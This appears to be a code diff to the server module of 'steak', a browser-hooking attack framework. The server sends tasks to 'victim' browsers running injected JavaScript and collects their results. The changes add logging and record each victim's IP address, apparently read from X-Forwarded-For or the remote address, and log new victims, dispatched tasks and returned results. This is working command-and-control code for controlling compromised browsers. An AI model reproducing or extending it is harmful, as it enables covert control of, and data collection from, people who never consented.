@@ -7,6 +7,7 @@ import queue
 from steak.utils import uniquerandstring
 from steak.utils import base64decode,base64encode
 from .Project import Project
+from .Logger import Logger
 from .Client import Client
 import _thread
 
@@ -17,6 +18,7 @@ class Server:
     It can also provide hooking javascript to victim and send task to victim
     '''
     def __init__(self,ip:str,port:int,projects,callbackpath:str) -> None:
+        self.logger = Logger(logger="Server.py")
         self.ip=ip
         self.port=port
         self.projects=projects
@@ -39,16 +41,6 @@ class Server:
         return 'http://'+self.ip+':'+str(self.port)+self.callbackpath
 
 
-    def _createclient(self,project:Project)->Client:
-        '''
-        Creates and return a client object from a project object
-        its client id is automatically generated
-        '''
-        newclientid=uniquerandstring(self.clientids)
-        self.clientids.add(newclientid)
-        client=Client(newclientid,project)
-        return client 
-
     def generate_response(self,s:str)->Response:
         '''
         Generates a response who has a header Access-Control-Allow-Origin:* 
@@ -65,6 +57,17 @@ class Server:
         '''
         self.path2callback[path]=callback
 
+    def get_clientip(self,enablexff:bool=False)->str:
+        '''
+        Gets client IP address
+        It doesn't trsut X-Forwarded-For header unless you set enablexff True
+        '''
+        if enablexff:
+            clientip=request.headers.getlist("X-Forwarded-For")[0]
+            #check if ip valid
+            if all([0<=int(i)<=255 for i in clientip.split('.')]) and len(clientip.split('.'))==4:
+                return clientip
+        return request.remote_addr
 
     def run(self):
         '''
@@ -86,12 +89,18 @@ class Server:
             clientid=content['clientbasicinfo']['clientid']
             project=self.jsurl2projects[content['clientbasicinfo']['jsurl']]
             dataupload=content['dataupload']
+            clientip=self.get_clientip()
+            if isinstance(dataupload,dict):
+                dataupload['clientipaddress']=clientip
             
             if clientid not in self.clientid2client:
                 try:
                     client=Client(clientid,project,dataupload)
+                    self.logger.info(f'A new client connected to us with ip address {clientip} with clientid {client.clientid}')
                 except Exception as e: 
+                    #print(e)
                     #Error occurs because we restarted our server so that we've forgot the victim who remembers us
+                    self.logger.info(f'A client we forgot connected to us with ip address {clientip}')
                     return self.generate_response('Restart') #forget me and restart !
                 self.clientid2client[clientid]=client
                 project.clients[clientid]=client
@@ -100,6 +109,8 @@ class Server:
                 return self.generate_response('')
             else:
                 client=self.clientid2client[clientid]
+            #update client ip address
+            client.ip=request.remote_addr
             '''
             "Rollback" means retrieve new task from server
             So this request means the client submits task result to us
@@ -108,6 +119,7 @@ class Server:
             '''
             if dataupload!="Rollback":
                 taskid=content['clientbasicinfo']['taskid']
+                self.logger.info(f'An old client with clientid {client.clientid} finished its task with taskid:{taskid}')
                 payloadobj=self.taskid2payloadobj[taskid]
                 result=payloadobj.module.parse_result(dataupload)
                 client.taskresult[taskid]=result
@@ -121,8 +133,10 @@ class Server:
             task=client.pop_latest_task()
             if task:
                 self.taskid2payloadobj[task.taskid]=task
+                self.logger.info(f'sending task with {task.taskid} to client with ip address {clientip} and clientid {client.clientid}')
                 return self.generate_response(task.payload_str)
             else:
+                self.logger.debug(f'no task for client with ip address {clientip} and clientid {client.clientid}')
                 return self.generate_response('')
             
 
